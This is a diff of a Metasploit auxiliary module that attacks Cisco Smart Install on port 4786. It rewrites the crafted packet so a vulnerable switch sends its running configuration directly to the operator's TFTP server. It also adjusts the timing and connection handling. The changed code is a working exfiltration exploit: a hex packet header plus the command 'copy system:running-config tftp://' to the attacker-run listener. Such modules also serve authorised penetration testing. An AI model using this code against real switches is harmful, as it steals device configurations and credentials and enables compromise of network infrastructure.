@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
           and determines if it speaks the Smart Install Protocol.  Exposure of SMI
           to untrusted networks can allow complete compromise of the switch.
         ),
-        'Author'         => 'Jon Hart <jon_hart[at]rapid7.com>',
+        'Author'         => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],
         'References'     =>
           [
             ['URL', 'https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
@@ -43,23 +43,21 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(4786),
         OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
         OptInt.new('SLEEP', [ true, "Time to wait for config to come back", 60]),
-        OptInt.new('DELAY', [ true, "Time to wait till requesting config to prevent service from becomming unresponsive.", 30])
+        OptInt.new('DELAY', [ true, "Time to wait till requesting config to prevent service from becomming unresponsive.", 60])
       ]
     )
   end
 
   def start_tftp(req_type)
-    # http://rapid7.github.io/metasploit-framework/api/Rex/Proto/TFTP/Server.html
     print_status("Starting TFTP Server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
     case
       when req_type == "PUT"
         @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
         @tftp.start
-      when req_type == "GET" # yeah yeah, so original. lmao.
-        # read global variables data, and size
-        config_exec_data = @config_exec.read(@config_exec.stat.size)
-        @tftp.register_file("#{Rex::Text.rand_text_alpha}.conf", config_exec_data)
+      when req_type == "GET" # in progress of writing "UPLOAD" function
+        config = @config.read(@config.stat.size)
+        @tftp.register_file("#{Rex::Text.rand_text_alpha}.conf", config)
         @tftp.start
     end
     add_socket(@tftp.sock)
@@ -104,11 +102,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def craft_packet
-    config_name = "#{Rex::Text.rand_text_alpha(8)}.conf"
-    copy_config = "copy system:running-config flash:/#{config_name}"
-    transfer_config = "copy flash:/#{config_name} tftp://#{@lhost}/#{config_name}"
+    copy_config = "copy system:running-config tftp://#{@lhost}/#{Rex::Text.rand_text_alpha(8)}"
     packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
-    packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (transfer_config + decode_hex(('00' * (336 - transfer_config.length)))) + (decode_hex(('00' * 336)))
+    packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (decode_hex(('00' * (336)))) + (decode_hex(('00' * 336)))
     return packet
   end
 
@@ -142,8 +138,10 @@ class MetasploitModule < Msf::Auxiliary
           start_tftp("PUT")
           connect
           return unless smi?
+          disconnect # cant send any additional packets, so closing
+          connect
           print_status("Waiting #{datastore['DELAY']} seconds before requesting config")
-          Rex.sleep(datastore['DELAY']) # reasnoning behind this, on some IOS versions, including my testbed, it becomes unresponsive after SMI
+          Rex.sleep(datastore['DELAY']) 
           packet = craft_packet
           print_status("Requesting configuration from device...")
           print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
